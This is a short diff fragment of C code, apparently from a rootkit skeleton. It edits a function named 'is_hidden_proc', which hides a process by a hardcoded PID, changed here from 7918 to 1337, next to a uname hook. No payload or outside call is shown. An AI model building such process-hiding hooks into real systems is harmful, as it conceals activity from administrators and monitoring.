@@ -149,7 +149,8 @@ int goofy_uname(struct utsname *buf){
 }
 
 int is_hidden_proc(pid_t pid){
-	if (pid == 7918){
+	//Skeleton code
+	if (pid == 1337){
 		return 1;
 	}
 	return 0;
